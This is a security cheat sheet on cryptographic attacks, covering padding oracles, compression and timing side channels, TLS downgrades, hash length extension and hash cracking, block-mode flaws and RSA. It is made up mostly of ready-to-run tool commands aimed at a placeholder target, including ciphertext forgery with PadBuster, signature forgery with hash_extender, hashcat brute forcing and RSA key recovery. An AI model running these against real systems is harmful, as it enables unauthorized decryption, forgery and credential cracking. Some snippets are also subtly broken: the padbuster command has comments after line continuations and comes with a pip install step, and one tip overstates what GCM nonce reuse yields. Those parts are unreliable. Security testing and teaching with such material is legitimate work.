# Cryptography Attacks (Cryptographic Attack Patterns and Exploitation)

> For authorized security testing, CTF competitions, and educational purposes only.

Cryptographic systems fail not because the math is wrong, but because implementations
introduce side channels, misuse primitives, or rely on deprecated protocols. This sheet
covers padding oracles, compression side channels, timing attacks, protocol downgrades,
hash abuse, block cipher mode attacks, and RSA exploitation.

---

## Padding Oracle Attacks

### CBC Padding Oracle (PKCS#7)

```bash
# A padding oracle reveals whether decryption produced valid padding
# via error codes, timing, or behavioral differences

# PadBuster — automated padding oracle exploitation
pip install padbuster

# Decrypt a ciphertext using the padding oracle
padbuster http://target.com/decrypt?data=ENCRYPTED_DATA \
  ENCRYPTED_DATA \
  16 \                                   # block size (16 for AES-CBC)
  -encoding 0 \                          # 0=Base64, 1=hex
  -error "Padding error"                 # string indicating bad padding

# Encrypt arbitrary plaintext (forge valid ciphertext)
padbuster http://target.com/decrypt?data=ENCRYPTED_DATA \
  ENCRYPTED_DATA \
  16 \
  -plaintext "admin=true" \
  -encoding 0
```

### Detecting Padding Oracles

```bash
# Look for behavioral differences between valid and invalid padding

# HTTP status code difference
curl -s -o /dev/null -w "%{http_code}" "http://target.com/api?token=VALID_CIPHER"
curl -s -o /dev/null -w "%{http_code}" "http://target.com/api?token=MODIFIED"

# Timing-based detection
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{time_total}\n" "http://target.com/api?token=VALID" >> valid.txt
  curl -s -o /dev/null -w "%{time_total}\n" "http://target.com/api?token=INVALID" >> invalid.txt
done
awk '{s+=$1}END{print s/NR}' valid.txt
awk '{s+=$1}END{print s/NR}' invalid.txt
# Consistent difference indicates timing oracle
```

---

## Compression Side-Channel Attacks

### CRIME and BREACH

```bash
# CRIME exploits TLS-level compression to recover session cookies
# BREACH targets HTTP compression (works even with TLS 1.3)

# Check for TLS compression (CRIME prerequisite)
openssl s_client -connect target.com:443 2>&1 | grep "Compression"
# "Compression: NONE" = safe; "Compression: zlib" = vulnerable
testssl.sh --compression target.com:443

# Check for HTTP compression (BREACH prerequisite)
curl -s -H "Accept-Encoding: gzip,deflate" -D - http://target.com/ | head -20
# Look for: Content-Encoding: gzip

# BREACH requires three conditions:
# 1. Response reflects user input
# 2. Response contains a secret (CSRF token, etc.)
# 3. Response is compressed

# Detect mitigation: random padding varies response size
curl -s http://target.com/page -o /dev/null -w "%{size_download}"
# Multiple requests returning different sizes suggest padding mitigation
```

---

## Timing Side-Channel Attacks

### String Comparison Timing

```bash
# Non-constant-time comparison leaks token/password content
# Each correct byte takes slightly longer due to early-exit comparison

# Timing attack with statistical sampling
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{time_total}\n" \
    "http://target.com/api?token=AAAA..." >> times_A.txt
  curl -s -o /dev/null -w "%{time_total}\n" \
    "http://target.com/api?token=BAAA..." >> times_B.txt
done
# Compare averages — higher average indicates correct first byte
awk '{s+=$1}END{print s/NR}' times_A.txt
awk '{s+=$1}END{print s/NR}' times_B.txt
```

### Constant-Time Comparison (Correct Implementations)

```bash
# Go:     subtle.ConstantTimeCompare() or hmac.Equal()
# Python: hmac.compare_digest(a, b)
# JS:     crypto.timingSafeEqual(a, b)
# C:      CRYPTO_memcmp() from OpenSSL

# These use: result = XOR all bytes, return result == 0
# No early exit regardless of content
```

---

## Protocol Downgrade Attacks

### POODLE, FREAK, Logjam

```bash
# POODLE — forces TLS fallback to SSLv3, exploits CBC padding
openssl s_client -ssl3 -connect target.com:443 2>&1
# Connection success = vulnerable
testssl.sh --poodle target.com:443
nmap -p 443 --script ssl-poodle target.com

# FREAK — RSA export cipher downgrade (512-bit RSA)
openssl s_client -connect target.com:443 -cipher EXPORT 2>&1

# Logjam — DHE export cipher downgrade (512-bit DH)
openssl s_client -connect target.com:443 -cipher DHE 2>&1 | grep "Server Temp Key"
# "DH, 512 bits" or "DH, 1024 bits" = weak

# TLS Fallback SCSV check (downgrade prevention)
openssl s_client -connect target.com:443 -fallback_scsv 2>&1
# "inappropriate fallback" = server supports SCSV (good)
```

### Version Enumeration

```bash
# Full TLS version enumeration
for v in ssl2 ssl3 tls1 tls1_1 tls1_2 tls1_3; do
  echo -n "$v: "
  openssl s_client -"$v" -connect target.com:443 2>&1 | \
    grep -o "Protocol.*" || echo "not supported"
done

# Server should reject anything below TLS 1.2
testssl.sh --protocols target.com:443
```

---

## Hash Attacks

### Hash Length Extension

```bash
# Vulnerable pattern: H(secret || message) using MD5/SHA-1/SHA-256
# Attacker computes H(secret || message || padding || extension)
# without knowing the secret

# hash_extender tool
git clone https://github.com/iagox86/hash_extender.git
cd hash_extender && make

./hash_extender \
  --data "user=admin" \
  --secret-min 8 --secret-max 32 \
  --append "&role=superadmin" \
  --signature "e3b0c44298fc1c14..." \
  --format sha256

# Immune constructions: HMAC, SHA-3, BLAKE2
```

### Birthday Attacks and Hash Cracking

```bash
# Birthday bound: 50% collision at ~2^(n/2) hashes
# MD5 (128-bit): ~2^64 operations
# SHA-1 (160-bit): ~2^63 (SHAttered practical attack)

# hashcat — GPU-accelerated hash cracking
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a   # MD5 brute force
hashcat -m 1400 -a 0 hashes.txt wordlist.txt -r rules/best64.rule
hashcat -m 0 --show hashes.txt           # show cracked results
hashcat -b                               # benchmark GPU speed
```

---

## Block Cipher Mode Attacks

### ECB Penguin (Pattern Detection)

```bash
# ECB encrypts identical plaintext blocks to identical ciphertext
# Any repeated ciphertext blocks confirm ECB mode

python3 -c "
import sys
data = open(sys.argv[1], 'rb').read()
block_size = 16
blocks = [data[i:i+block_size] for i in range(0, len(data), block_size)]
unique = len(set(blocks))
total = len(blocks)
print(f'Total blocks: {total}, Unique: {unique}')
if unique < total:
    print(f'REPEATED BLOCKS DETECTED — likely ECB mode')
    print(f'Repetition rate: {(total-unique)/total*100:.1f}%')
" encrypted_file.bin
```

### IV Reuse and Nonce Misuse

```bash
# AES-CTR with reused nonce: C1 XOR C2 = P1 XOR P2
# Use crib dragging to recover both plaintexts

# AES-GCM with reused nonce: complete authentication key recovery
# Once auth key H is known, arbitrary message forgeries are possible

# Detect nonce reuse in captured TLS traffic
tshark -r capture.pcap -T fields -e tls.record.iv 2>/dev/null | sort | uniq -d
```

---

## RSA Attacks

### Bleichenbacher Attack (PKCS#1 v1.5)

```bash
# Exploits PKCS#1 v1.5 padding validation oracle
# Recovers premaster secret in ~10K-100K oracle queries

# ROBOT scanner — detect Bleichenbacher oracle in TLS
testssl.sh --robot target.com:443
nmap -p 443 --script tls-robot target.com
```

### Small Exponent and Key Analysis

```bash
# RSA with e=3 and no padding: if m^3 < n, take integer cube root
# Hastad's broadcast: same message to 3+ recipients with e=3

# RsaCtfTool — automated RSA attack selection
git clone https://github.com/RsaCtfTool/RsaCtfTool.git
cd RsaCtfTool && pip install -r requirements.txt

# Automatic attack
python3 RsaCtfTool.py -n <modulus> -e <exponent> --uncipher <ciphertext>

# Factor weak key and extract private key
python3 RsaCtfTool.py --publickey public.pem --private
```

---

## Meet-in-the-Middle Attacks

```bash
# Double encryption: C = E(k2, E(k1, P))
# Brute force: 2^(2n) — but MITM reduces to 2^(n+1)

# Principle:
# 1. Encrypt plaintext with all possible k1 → store in hash table
# 2. Decrypt ciphertext with all possible k2 → look up in table
# 3. Match reveals (k1, k2) pair

# This is why 2DES provides only ~57 bits of security, not 112
# 3DES uses three keys specifically to defeat MITM
```

---

## Comprehensive TLS Assessment

```bash
# testssl.sh — full TLS vulnerability scanner
git clone https://github.com/drwetter/testssl.sh.git
cd testssl.sh

# Full scan
./testssl.sh target.com:443

# Targeted vulnerability checks
./testssl.sh --heartbleed target.com:443
./testssl.sh --crime target.com:443
./testssl.sh --breach target.com:443
./testssl.sh --sweet32 target.com:443
./testssl.sh --robot target.com:443
./testssl.sh --freak --logjam target.com:443

# JSON output for automation
./testssl.sh --jsonfile results.json target.com:443

# sslyze — Python-based TLS scanner
pip install sslyze
sslyze target.com:443 --regular
```

---

## Tips

- Padding oracle attacks need only ~128 requests per byte — any behavioral difference suffices
- BREACH works even with TLS 1.3 because it targets HTTP compression, not TLS compression
- Timing attacks need 100+ samples per comparison point with percentile analysis
- ECB mode detection is trivial — any repeated ciphertext blocks confirm the mode
- AES-GCM nonce reuse is catastrophic (full key recovery), unlike CTR (only plaintext XOR)
- Hash length extension only affects Merkle-Damgard constructions — HMAC and SHA-3 are immune
- ROBOT (Bleichenbacher) still affects ~2.8% of major websites — always test RSA key exchange
- testssl.sh is the single most comprehensive TLS vulnerability assessment tool
- Meet-in-the-middle is why key sizes do not double security for double encryption
- Always check both TLS library version AND configuration — patched but misconfigured is vulnerable

---

## See Also

- cryptography
- tls
- openssl
- pki

## References

- [PadBuster](https://github.com/AonCyberLabs/PadBuster)
- [BREACH Attack](http://breachattack.com/)
- [testssl.sh](https://testssl.sh/)
- [hashcat](https://hashcat.net/hashcat/)
- [ROBOT Attack](https://robotattack.org/)
- [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool)
- [hash_extender](https://github.com/iagox86/hash_extender)
- [tlsfuzzer](https://github.com/tlsfuzzer/tlsfuzzer)
